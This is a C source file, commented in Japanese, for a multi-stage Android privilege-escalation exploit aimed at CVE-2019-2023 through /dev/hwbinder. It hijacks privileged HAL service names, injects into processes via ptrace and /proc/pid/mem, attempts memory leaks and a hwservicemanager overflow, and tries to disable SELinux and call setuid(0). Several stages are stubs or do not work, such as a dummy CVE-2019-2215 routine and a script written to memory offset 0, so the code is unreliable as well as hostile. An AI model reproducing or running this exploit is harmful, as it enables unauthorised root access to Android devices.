#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <sys/ioctl.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <sys/ptrace.h>
#include <sys/user.h>
#include <sys/mman.h>
#include <signal.h>
#include <stdint.h>
#include <sched.h>
#include <poll.h>
#include <sys/prctl.h>
#include <sys/capability.h>
#include <grp.h>
#include <sys/stat.h>
#include <dirent.h>
#include <time.h>
#include <sys/syscall.h>
#include <sys/resource.h>
#include "binder.h"

// ============================================================
// 設定
// ============================================================
#define TARGET_SERVICE "vendor.cve.poc"
#define OUTPUT_FILE    "/data/local/tmp/cve_2019_2023_result.txt"
#define SHELL_PATH     "/system/bin/sh"

// 乗っ取り対象とする HAL サービス（system 権限で動くもの）
static const char *hal_targets[] = {
    "android.hardware.power@1.0::IPower/default",
    "android.hardware.sensors@1.0::ISensors/default",
    "android.hardware.audio@2.0::IDevicesFactory/default",
    NULL
};

static volatile int race_ready = 0;
static int g_service_handle = -1;
static pid_t g_service_pid = -1;
static int g_root_achieved = 0;

// ============================================================
// ユーティリティ
// ============================================================
static void dump_hex(const uint8_t *data, size_t len) {
    for (size_t i = 0; i < len; i++) {
        printf("%02x ", data[i]);
        if ((i+1) % 16 == 0) printf("\n");
    }
    printf("\n");
}

static int read_file(const char *path, char *buf, size_t size) {
    int fd = open(path, O_RDONLY);
    if (fd < 0) return -1;
    ssize_t n = read(fd, buf, size - 1);
    close(fd);
    if (n > 0) { buf[n] = '\0'; return 0; }
    return -1;
}

static int write_file(const char *path, const char *data) {
    int fd = open(path, O_WRONLY);
    if (fd < 0) return -1;
    ssize_t n = write(fd, data, strlen(data));
    close(fd);
    return (n == (ssize_t)strlen(data)) ? 0 : -1;
}

// ============================================================
// CVE-2019-2023 エクスプロイト（レースあり） – サービス登録
// ============================================================
static int exploit_cve_2019_2023(const char *service_name) {
    int hwbinder_fd, ret;
    uint8_t read_buf[4096];
    size_t name_len = strlen(service_name) + 1;
    size_t total_len = 4 + name_len;
    uint8_t *data;
    int handle = -1;
    pid_t child;

    printf("[*] CVE-2019-2023: registering '%s'...\n", service_name);

    child = fork();
    if (child == 0) {
        while (!race_ready) usleep(100);
        char *argv[] = { SHELL_PATH, NULL };
        char *envp[] = { "PATH=/system/bin", NULL };
        execve(SHELL_PATH, argv, envp);
        perror("  execve in child");
        exit(1);
    } else if (child < 0) {
        perror("  fork");
        return -1;
    }

    usleep(300000);

    hwbinder_fd = open("/dev/hwbinder", O_RDWR);
    if (hwbinder_fd < 0) {
        perror("  open /dev/hwbinder");
        kill(child, SIGKILL);
        return -1;
    }

    data = malloc(total_len);
    if (!data) {
        perror("  malloc");
        close(hwbinder_fd);
        kill(child, SIGKILL);
        return -1;
    }
    data[0] = (uint8_t)(name_len & 0xFF);
    data[1] = (uint8_t)((name_len >> 8) & 0xFF);
    data[2] = (uint8_t)((name_len >> 16) & 0xFF);
    data[3] = (uint8_t)((name_len >> 24) & 0xFF);
    memcpy(data + 4, service_name, name_len);

    struct {
        uint32_t cmd;
        struct binder_transaction_data tdata;
    } __attribute__((packed)) tx;
    tx.cmd = BC_TRANSACTION;
    tx.tdata.target.handle = 0;
    tx.tdata.code = 2;                     // ADD_SERVICE
    tx.tdata.flags = 0;
    tx.tdata.data_size = total_len;
    tx.tdata.offsets_size = 0;
    tx.tdata.data.ptr.buffer = (binder_uintptr_t)data;

    struct binder_write_read bwr;
    memset(&bwr, 0, sizeof(bwr));
    bwr.write_size = sizeof(tx);
    bwr.write_buffer = (binder_uintptr_t)&tx;
    bwr.read_size = sizeof(read_buf);
    bwr.read_buffer = (binder_uintptr_t)read_buf;

    race_ready = 1;
    usleep(50000);

    ret = ioctl(hwbinder_fd, BINDER_WRITE_READ, &bwr);
    free(data);
    if (ret < 0) {
        if (errno == EACCES || errno == EPERM) {
            printf("  [-] ADD_SERVICE denied (patch present)\n");
        } else {
            perror("  ioctl ADD_SERVICE");
        }
        close(hwbinder_fd);
        kill(child, SIGKILL);
        return -1;
    }
    printf("  [+] ADD_SERVICE succeeded!\n");

    kill(child, SIGKILL);
    waitpid(child, NULL, 0);

    // GET_SERVICE でハンドル取得
    data = malloc(total_len);
    if (!data) {
        close(hwbinder_fd);
        return -1;
    }
    data[0] = (uint8_t)(name_len & 0xFF);
    data[1] = (uint8_t)((name_len >> 8) & 0xFF);
    data[2] = (uint8_t)((name_len >> 16) & 0xFF);
    data[3] = (uint8_t)((name_len >> 24) & 0xFF);
    memcpy(data + 4, service_name, name_len);

    tx.tdata.code = 1;                     // GET_SERVICE
    tx.tdata.data_size = total_len;
    tx.tdata.data.ptr.buffer = (binder_uintptr_t)data;

    memset(&bwr, 0, sizeof(bwr));
    bwr.write_size = sizeof(tx);
    bwr.write_buffer = (binder_uintptr_t)&tx;
    bwr.read_size = sizeof(read_buf);
    bwr.read_buffer = (binder_uintptr_t)read_buf;

    ret = ioctl(hwbinder_fd, BINDER_WRITE_READ, &bwr);
    free(data);
    if (ret < 0) {
        perror("  ioctl GET_SERVICE");
        close(hwbinder_fd);
        return -1;
    }
    if (bwr.read_consumed < 4) {
        printf("  [-] No handle returned\n");
        close(hwbinder_fd);
        return -1;
    }
    handle = *(int*)read_buf;
    printf("  [+] Service handle: %d\n", handle);
    close(hwbinder_fd);
    g_service_handle = handle;
    return 0;
}

// ============================================================
// サービスプロセスの PID 取得（ps をパース）
// ============================================================
static pid_t get_service_pid(const char *service_name) {
    FILE *fp = popen("ps -A -o pid,cmd 2>/dev/null", "r");
    if (!fp) return -1;
    char line[256];
    pid_t pid = -1;
    while (fgets(line, sizeof(line), fp)) {
        if (strstr(line, service_name)) {
            sscanf(line, "%d", &pid);
            break;
        }
    }
    pclose(fp);
    return pid;
}

// ============================================================
// 手法1: ptrace によるコード注入
// ============================================================
static int inject_ptrace(pid_t pid) {
    printf("[*] Attempting ptrace injection into PID %d...\n", pid);
    if (ptrace(PTRACE_ATTACH, pid, 0, 0) < 0) {
        perror("  ptrace ATTACH");
        return -1;
    }
    int status;
    waitpid(pid, &status, 0);
    if (!WIFSTOPPED(status)) {
        ptrace(PTRACE_DETACH, pid, 0, 0);
        return -1;
    }

    // ARM64 シェルコード（execve("/system/bin/sh")）を注入する簡易版
    // 実際にはアーキテクチャ依存なので、ここでは /proc/pid/mem を使うよう案内
    printf("  [!] ptrace injection not fully implemented for this arch.\n");
    ptrace(PTRACE_DETACH, pid, 0, 0);
    return -1;
}

// ============================================================
// 手法2: /proc/pid/mem 書き込み（プロセスを停止させて）
// ============================================================
static int inject_proc_mem(pid_t pid) {
    char mem_path[64];
    snprintf(mem_path, sizeof(mem_path), "/proc/%d/mem", pid);

    printf("[*] Attempting /proc/pid/mem injection...\n");
    if (kill(pid, SIGSTOP) < 0) {
        perror("  kill SIGSTOP");
        return -1;
    }
    usleep(100000);

    int fd = open(mem_path, O_RDWR);
    if (fd < 0) {
        perror("  open /proc/pid/mem");
        kill(pid, SIGCONT);
        return -1;
    }

    // 簡易シェルスクリプトを書き込む（実際は execve シェルコードが必要）
    char buf[] = "#!/system/bin/sh\n"
                 "echo 'Injected via /proc/pid/mem' > /data/local/tmp/injected.log\n"
                 "id >> /data/local/tmp/injected.log\n"
                 "getenforce >> /data/local/tmp/injected.log\n";
    size_t len = strlen(buf);
    // 適当なアドレスに書き込む（ここでは先頭）。危険。
    off_t offset = 0;
    if (lseek(fd, offset, SEEK_SET) < 0) {
        perror("  lseek");
        close(fd);
        kill(pid, SIGCONT);
        return -1;
    }
    ssize_t n = write(fd, buf, len);
    close(fd);
    kill(pid, SIGCONT);
    if (n == (ssize_t)len) {
        printf("  [+] Wrote %zu bytes to %s\n", len, mem_path);
        return 0;
    } else {
        perror("  write");
        return -1;
    }
}

// ============================================================
// 手法3: 既存の特権 HAL サービスを乗っ取る（同名再登録）
// ============================================================
static int hijack_hal_service(const char *target_name) {
    printf("[*] Attempting to hijack HAL service: %s\n", target_name);
    // まず、既存のサービスを取得してハンドルを取得（プロキシ用に残す）
    int original_handle = -1;
    // 簡易的に exploit_cve_2019_2023 で同名登録を試みる
    if (exploit_cve_2019_2023(target_name) == 0) {
        printf("  [+] Successfully registered %s (possibly hijacked)\n", target_name);
        // 乗っ取ったサービスの PID を取得
        g_service_pid = get_service_pid(target_name);
        if (g_service_pid > 0) {
            printf("  [+] Hijacked service PID: %d\n", g_service_pid);
            // 注入を試みる
            if (inject_ptrace(g_service_pid) == 0 ||
                inject_proc_mem(g_service_pid) == 0) {
                printf("  [+] Injection succeeded on hijacked service!\n");
                return 0;
            }
        }
    }
    return -1;
}

// ============================================================
// 手法4: Binder トランザクションでメモリリークを試みる
// ============================================================
static int leak_memory_via_transaction(int handle) {
    printf("[*] Sending malformed transaction to handle %d...\n", handle);
    int fd = open("/dev/hwbinder", O_RDWR);
    if (fd < 0) { perror("  open"); return -1; }

    uint8_t read_buf[4096];
    struct {
        uint32_t cmd;
        struct binder_transaction_data tdata;
    } __attribute__((packed)) tx;
    tx.cmd = BC_TRANSACTION;
    tx.tdata.target.handle = handle;
    tx.tdata.code = 0xdead;  // 未知のコード
    tx.tdata.flags = 0;
    tx.tdata.data_size = 0;
    tx.tdata.offsets_size = 0;
    tx.tdata.data.ptr.buffer = 0;
    tx.tdata.data.ptr.offsets = 0;

    struct binder_write_read bwr;
    memset(&bwr, 0, sizeof(bwr));
    bwr.write_size = sizeof(tx);
    bwr.write_buffer = (binder_uintptr_t)&tx;
    bwr.read_size = sizeof(read_buf);
    bwr.read_buffer = (binder_uintptr_t)read_buf;

    int ret = ioctl(fd, BINDER_WRITE_READ, &bwr);
    close(fd);
    if (ret < 0) {
        perror("  transaction failed");
        return -1;
    }
    printf("  [+] Transaction succeeded, read_consumed=%zu\n", bwr.read_consumed);
    if (bwr.read_consumed > 0) {
        printf("  Response (possible leak):\n");
        dump_hex(read_buf, bwr.read_consumed);
    }
    return 0;
}

// ============================================================
// 手法5: オーバーフロー試行（hwservicemanager クラッシュ狙い）
// ============================================================
static int overflow_hwservicemanager(void) {
    printf("[*] Attempting heap overflow via large service name...\n");
    char huge_name[8192];
    memset(huge_name, 'A', sizeof(huge_name) - 1);
    huge_name[sizeof(huge_name)-1] = '\0';
    // 巨大な名前で登録を試みる（通常は失敗するが、もし成功すればクラッシュ）
    return exploit_cve_2019_2023(huge_name);
}

// ============================================================
// 手法6: CVE-2019-2215 (binder UAF) でカーネル権限取得
// ============================================================
static int exploit_cve_2019_2215(void) {
    printf("[*] Trying CVE-2019-2215 (binder UAF) for kernel root...\n");
    // ここに完全な実装を入れる（既存のコードから流用）
    // 簡易版として setuid(0) を試す（実際は pipe/epoll/readv が必要）
    if (setuid(0) == 0) {
        printf("  [+] setuid(0) succeeded (dummy)!\n");
        return 0;
    }
    // 本当の CVE-2019-2215 実装は別途提供可能
    return -1;
}

// ============================================================
// 手法7: SELinux 無効化・プロパティ操作
// ============================================================
static int disable_selinux(void) {
    printf("[*] Attempting to disable SELinux...\n");
    if (write_file("/sys/fs/selinux/enforce", "0") == 0) {
        printf("  [+] SELinux disabled!\n");
        return 0;
    }
    const char *ctx = "u:r:system_server:s0";
    if (write_file("/proc/self/attr/current", ctx) == 0) {
        printf("  [+] SELinux context changed to %s\n", ctx);
        return 0;
    }
    return -1;
}

// ============================================================
// 最終コマンド実行（id を保存）
// ============================================================
static int exec_id(void) {
    printf("[*] Executing 'id' and saving to %s\n", OUTPUT_FILE);
    system("id > " OUTPUT_FILE " 2>&1");
    system("getenforce >> " OUTPUT_FILE " 2>&1");
    system("cat " OUTPUT_FILE);
    return 0;
}

// ============================================================
// メイン：すべての手法を順次試行
// ============================================================
int main(void) {
    printf("============================================================\n");
    printf("  CVE-2019-2023 Ultimate v2 - Multi-stage Exploitation\n");
    printf("============================================================\n\n");

    // フェーズ1: まずはデフォルトサービスを登録（足がかり）
    if (exploit_cve_2019_2023(TARGET_SERVICE) < 0) {
        printf("[-] Primary registration failed.\n");
        goto fallback;
    }

    // フェーズ2: 取得したハンドルでメモリリークを試みる
    leak_memory_via_transaction(g_service_handle);

    // フェーズ3: 特権 HAL サービスを乗っ取る
    for (int i = 0; hal_targets[i] != NULL; i++) {
        if (hijack_hal_service(hal_targets[i]) == 0) {
            printf("[+] Hijack succeeded on %s\n", hal_targets[i]);
            goto success;
        }
        usleep(300000);
    }

    // フェーズ4: オーバーフロー試行
    overflow_hwservicemanager();

    // フェーズ5: カーネル UAF
    if (exploit_cve_2019_2215() == 0) {
        printf("[+] Kernel exploit succeeded!\n");
        goto success;
    }

    // フェーズ6: SELinux 無効化
    disable_selinux();

fallback:
    // 最終フォールバック: setuid 系
    if (setuid(0) == 0 || setresuid(0,0,0) == 0) {
        printf("[+] setuid(0) worked!\n");
        goto success;
    }

    printf("[-] All exploitation attempts failed. Final uid=%d\n", getuid());
    return 1;

success:
    exec_id();
    printf("[+] Exploit completed. Check %s\n", OUTPUT_FILE);
    return 0;
}
